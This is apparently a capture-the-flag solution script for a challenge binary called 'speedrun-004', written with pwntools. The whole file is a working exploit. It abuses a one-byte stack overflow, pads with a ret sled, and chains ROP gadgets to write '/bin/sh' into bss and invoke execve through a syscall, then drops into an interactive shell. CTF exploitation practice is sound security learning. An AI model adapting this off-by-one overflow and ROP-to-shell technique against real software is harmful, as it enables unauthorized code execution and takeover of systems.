from pwn import *
# b *0x00400baf
gdbcmds = '''
b *0x00400bb4
c
'''

#target = gdb.debug('./speedrun-004', gdbscript=gdbcmds)
target = process('./speedrun-004')
# 256 byte buffer, read 257 bytes, 1 byte overflow
# buffer addr: 0x7fffffffdb80

popRdx = 0x000000000044c6b6
popRsi = 0x0000000000410a93
popRdi = 0x0000000000400686
popRax = 0x0000000000415f04
movRdxtoRax = 0x000000000048d301 # mov qword ptri r  [rax], rdx ; ret
syscall = 0x000000000040132c
binsh = 0x0068732f6e69622f
bss = 0x6b6030
ret = p64(0x400416)

ROPchain = b""
ROPchain += p64(popRax)
ROPchain += p64(bss)
ROPchain += p64(popRdx)
ROPchain += p64(binsh)
ROPchain += p64(movRdxtoRax)

ROPchain += p64(popRax)
ROPchain += p64(0x3b)

ROPchain += p64(popRdi)
ROPchain += p64(bss)

ROPchain += p64(popRsi)
ROPchain += p64(0x0)
ROPchain += p64(popRdx)
ROPchain += p64(0x0)

ROPchain += p64(syscall)
payload = ret*((256 - len(ROPchain)) // 8) + ROPchain + b"\x00"
print(len(payload))

target.recvuntil(b"?")
target.sendline(b'257')
target.recvuntil(b"?")
target.sendline(payload)
target.interactive()
